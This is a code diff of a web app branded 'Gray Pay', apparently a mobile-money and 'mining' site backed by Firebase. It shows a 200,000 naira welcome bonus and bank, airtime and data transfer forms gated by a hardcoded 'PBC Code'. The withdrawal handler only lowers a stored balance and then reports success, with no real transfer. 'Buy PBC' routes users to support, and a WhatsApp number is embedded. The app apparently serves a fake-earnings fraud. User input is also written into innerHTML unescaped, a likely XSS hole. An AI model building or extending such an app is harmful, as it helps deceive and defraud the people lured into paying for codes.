-                <div class="transaction-detail-row">
-                    <span class="transaction-detail-label">Transaction ID</span>
-                    <span class="transaction-detail-value">${transId}</span>
-                </div>
-                <div class="transaction-detail-row">
-                    <span class="transaction-detail-label">Note</span>
-                    <span class="transaction-detail-value">${note}</span>
-                </div>
-                
-                <div class="receipt-actions">
-                    <button class="btn" onclick="shareReceipt('${transId}')">📤 Share receipt</button>
-                    <button class="btn" onclick="repeatTransaction('${type}')">🔄 Repeat Transfer</button>
-                </div>
-                
-                <div class="text-center mt-20">
-                    <span style="color: #10b981; cursor: pointer;" onclick="showHelp()">Trouble with your payment? Let us know on help center now</span>
-                </div>
-            </div>
-        `;
-        
-        document.getElementById('dynamicContent').innerHTML = detailsHtml;
-        showPage('dashboardPage');
-        document.getElementById('dashboardPage').classList.add('hidden');
-        document.getElementById('transactionDetailView').style.display = 'block';
-        document.getElementById('transactionDetailView').style.padding = '20px';
-    }
-    
-    function goBackToHistory() {
-        showTransactionHistory();
-    }
-    
-    function shareReceipt(transactionId) {
-        let transaction = currentUser.transactions.find(t => t.id == transactionId);
-        if(transaction) {
-            let details = transaction.fullDetails || {};
-            let shareText = `Gray Pay Transaction\nAmount: ₦${(details.amount || transaction.amount).toLocaleString()}\nType: ${transaction.type}\nDate: ${transaction.date}\nID: ${transactionId}`;
-            navigator.clipboard.writeText(shareText);
-            alert('Receipt copied to clipboard!');
-        } else {
-            alert('Unable to share receipt');
-        }
-    }
-    
-    function repeatTransaction(type) {
+    window.logout = async () => {
+        await window.signOut(window.auth);
+        currentUser = null;
+        currentUserData = null;
         closeDynamic();
-        if(type === 'Withdrawal') {
-            showWithdrawPage();
-        } else if(type === 'Airtime') {
-            showBuyAirtime();
-        } else if(type === 'Data') {
-            showBuyData();
-        } else {
-            showDashboardPage();
-        }
+        showWelcomePage();
+    };
+    
+    window.openWhatsApp = () => { window.open('https://wa.me/2348168909003','_blank'); };
+    window.showHelp = () => { document.getElementById('helpModal').style.display = 'flex'; };
+    window.closeHelp = () => { document.getElementById('helpModal').style.display = 'none'; };
+    
+    function showLoading(msg, ms) {
+        let loader = document.getElementById('loadingOverlay');
+        document.getElementById('loadingMsg').innerText = msg;
+        loader.style.display = 'flex';
     }
-
-    function showHelp() { document.getElementById('helpModal').style.display = 'flex'; }
-    function closeHelp() { document.getElementById('helpModal').style.display = 'none'; }
-    function showLoading(msg, ms, cb) { let loader = document.getElementById('loadingOverlay'); document.getElementById('loadingMsg').innerText = msg; loader.style.display = 'flex'; setTimeout(() => { loader.style.display = 'none'; if(cb) cb(); }, ms); }
-
+    function hideLoading() {
+        document.getElementById('loadingOverlay').style.display = 'none';
+    }
+    
+    window.showProfile = () => {
+        if(!currentUserData) return;
+        document.getElementById('dynamicContent').innerHTML = `<div id="profileView"><div class="header"><button class="back-btn" onclick="closeDynamic()">←</button><button class="help-btn" onclick="showHelp()">❓</button></div><div class="logo">Profile</div><div class="info-box">Full Name: ${currentUserData.firstname} ${currentUserData.surname}</div><div class="info-box">Email: ${currentUserData.email}</div><div class="info-box">Password: ********</div><button class="btn" onclick="logout()">Log Out</button></div>`;
+        showPage('dashboardPage'); document.getElementById('dashboardPage').classList.add('hidden'); document.getElementById('profileView').style.display = 'block'; document.getElementById('profileView').style.padding = '20px';
+    };
+    
+    window.closeDynamic = () => { document.getElementById('dynamicContent').innerHTML = ''; showDashboardPage(); };
+    
     function showWelcomePopup() {
         let popupHtml = `
             <div id="welcomePopup" style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.9); display: flex; align-items: center; justify-content: center; z-index: 3000;">
                 <div style="background: #1f1f1f; border-radius: 20px; padding: 30px; width: 85%; max-width: 350px; text-align: center;">
                     <div style="font-size: 50px; margin-bottom: 15px;">🎉</div>
-                    <h2 style="color: #10b981; margin-bottom: 10px;">Welcome ${currentUser.firstname}!</h2>
+                    <h2 style="color: #10b981; margin-bottom: 10px;">Welcome ${currentUserData.firstname}!</h2>
                     <p style="color: #9ca3af; margin-bottom: 20px;">You have received</p>
                     <div style="font-size: 36px; font-weight: bold; color: #10b981; margin-bottom: 20px;">₦200,000</div>
                     <p style="color: #9ca3af; margin-bottom: 25px;">Start mining every hour and withdraw your earnings anytime!</p>
@@ -748,13 +308,134 @@
         `;
         document.body.insertAdjacentHTML('beforeend', popupHtml);
     }
-
-    function closeWelcomePopup() {
+    
+    window.closeWelcomePopup = () => {
         let popup = document.getElementById('welcomePopup');
         if(popup) popup.remove();
-    }
-
-    autoLogin();
+    };
+    
+    window.showWithdrawPage = () => {
+        if(!currentUserData) return;
+        let banks = ['Access Bank', 'GTBank', 'First Bank', 'Zenith Bank', 'UBA', 'WEMA Bank', 'Polaris Bank', 'Fidelity Bank', 'Sterling Bank', 'PalmPay', 'Opay', 'Moniepoint', 'Kuda Bank'];
+        let opts = banks.map(b => `<option>${b}</option>`).join('');
+        document.getElementById('dynamicContent').innerHTML = `<div id="withdrawView"><div class="header"><button class="back-btn" onclick="closeDynamic()">←</button><button class="help-btn" onclick="showHelp()">❓</button></div><h2>Transfer To Bank</h2><input type="text" id="accName" class="input-field" placeholder="Account Name"><input type="text" id="accNumber" class="input-field" placeholder="Account Number"><select id="bankName" class="input-field">${opts}</select><input type="number" id="withdrawAmount" class="input-field" placeholder="Amount"><input type="text" id="pbcCode" class="input-field" placeholder="PBC Code (e.g., 1234)"><div class="info-box">Available: ₦${currentUserData.balance}</div><div class="min-withdrawal">⚠️ Minimum withdrawal: ₦100,000</div><button class="btn" onclick="processWithdraw()">Submit</button></div>`;
+        showPage('dashboardPage'); document.getElementById('dashboardPage').classList.add('hidden'); document.getElementById('withdrawView').style.display = 'block'; document.getElementById('withdrawView').style.padding = '20px';
+    };
+    
+    window.processWithdraw = async () => {
+        let amt = parseInt(document.getElementById('withdrawAmount').value);
+        let code = document.getElementById('pbcCode').value;
+        let accName = document.getElementById('accName').value;
+        let accNumber = document.getElementById('accNumber').value;
+        let bankName = document.getElementById('bankName').value;
+        
+        if(code !== '4234') { alert('Invalid PBC Code!'); return; }
+        if(amt < 100000) { alert('Minimum withdrawal is ₦100,000'); return; }
+        if(amt > currentUserData.balance) { alert('Insufficient balance'); return; }
+        if(!accName || !accNumber) { alert('Please fill account name and number'); return; }
+        
+        showLoading('Processing withdrawal...', 0);
+        
+        setTimeout(async () => {
+            currentUserData.balance -= amt;
+            let transactionId = 'TXN' + Date.now() + Math.floor(Math.random() * 1000);
+            let transaction = {
+                id: transactionId,
+                type: 'Withdrawal',
+                amount: amt,
+                date: new Date().toLocaleString(),
+                dateObj: new Date(),
+                status: 'Success',
+                fullDetails: {
+                    transactionType: 'Deposit To Bank',
+                    amount: amt,
+                    fees: 10,
+                    taxes: 0.75,
+                    sender: currentUserData.firstname + ' ' + currentUserData.surname,
+                    recipient: accName,
+                    recipientAccount: accNumber,
+                    recipientBank: bankName,
+                    transactionId: transactionId,
+                    note: 'Sent from my Gray Pay account'
+                }
+            };
+            if(!currentUserData.transactions) currentUserData.transactions = [];
+            currentUserData.transactions.unshift(transaction);
+            
+            await window.updateDoc(window.doc(window.db, 'users', currentUser.uid), {
+                balance: currentUserData.balance,
+                transactions: currentUserData.transactions
+            });
+            
+            hideLoading();
+            alert(`Withdrawal of ₦${amt} processed!`);
+            closeDynamic();
+            showDashboardPage();
+        }, 2000);
+    };
+    
+    window.showBuyAirtime = () => {
+        if(!currentUserData) return;
+        document.getElementById('dynamicContent').innerHTML = `<div id="airtimeView"><div class="header"><button class="back-btn" onclick="closeDynamic()">←</button><button class="help-btn" onclick="showHelp()">❓</button></div><h2>Buy Airtime</h2><input type="text" id="airPhone" class="input-field" placeholder="Phone Number"><input type="number" id="airAmount" class="input-field" placeholder="Amount"><input type="text" id="airCode" class="input-field" placeholder="PBC Code (e.g., 1234)"><button class="btn" onclick="processAirtime()">Buy Airtime</button></div>`;
+        showPage('dashboardPage'); document.getElementById('dashboardPage').classList.add('hidden'); document.getElementById('airtimeView').style.display = 'block'; document.getElementById('airtimeView').style.padding = '20px';
+    };
+    
+    window.processAirtime = async () => {
+        let code = document.getElementById('airCode').value;
+        let amt = parseInt(document.getElementById('airAmount').value);
+        let phone = document.getElementById('airPhone').value;
+        if(code !== '4234') { alert('Invalid PBC Code!'); return; }
+        if(!phone || !amt) { alert('Fill all fields'); return; }
+        if(amt > currentUserData.balance) { alert('Insufficient balance'); return; }
+        
+        currentUserData.balance -= amt;
+        await window.updateDoc(window.doc(window.db, 'users', currentUser.uid), { balance: currentUserData.balance });
+        alert(`Airtime of ₦${amt} purchased for ${phone}!`);
+        closeDynamic();
+        showDashboardPage();
+    };
+    
+    window.showBuyData = () => {
+        if(!currentUserData) return;
+        document.getElementById('dynamicContent').innerHTML = `<div id="dataView"><div class="header"><button class="back-btn" onclick="closeDynamic()">←</button><button class="help-btn" onclick="showHelp()">❓</button></div><h2>Buy Data</h2><input type="text" id="dataPhone" class="input-field" placeholder="Phone Number"><select id="dataPlan" class="input-field"><option value="500">500MB - ₦500</option><option value="1000">1GB - ₦1000</option><option value="2000">2GB - ₦2000</option><option value="5000">5GB - ₦5000</option><option value="10000">10GB - ₦10000</option></select><input type="text" id="dataCode" class="input-field" placeholder="PBC Code (e.g., 1234)"><button class="btn" onclick="processData()">Buy Data</button></div>`;
+        showPage('dashboardPage'); document.getElementById('dashboardPage').classList.add('hidden'); document.getElementById('dataView').style.display = 'block'; document.getElementById('dataView').style.padding = '20px';
+    };
+    
+    window.processData = async () => {
+        let code = document.getElementById('dataCode').value;
+        let phone = document.getElementById('dataPhone').value;
+        let plan = document.getElementById('dataPlan');
+        let amt = parseInt(plan.value);
+        if(code !== '4234') { alert('Invalid PBC Code!'); return; }
+        if(!phone) { alert('Enter phone number'); return; }
+        if(amt > currentUserData.balance) { alert('Insufficient balance'); return; }
+        
+        currentUserData.balance -= amt;
+        await window.updateDoc(window.doc(window.db, 'users', currentUser.uid), { balance: currentUserData.balance });
+        alert(`Data plan purchased for ${phone}!`);
+        closeDynamic();
+        showDashboardPage();
+    };
+    
+    window.showBuyPBC = () => { alert('Buy PBC feature - Contact support'); };
+    window.startMining = () => { alert('Mining feature coming soon!'); };
+    window.showTransactionHistory = () => { alert('Transaction history coming soon!'); };
+    
+    // Auto login check
+    window.onload = () => {
+        window.auth.onAuthStateChanged(async (user) => {
+            if(user) {
+                const userDoc = await window.getDoc(window.doc(window.db, 'users', user.uid));
+                if(userDoc.exists()) {
+                    currentUser = user;
+                    currentUserData = userDoc.data();
+                    showDashboardPage();
+                }
+            } else {
+                showWelcomePage();
+            }
+        });
+    };
 </script>
 </body>
 </html>
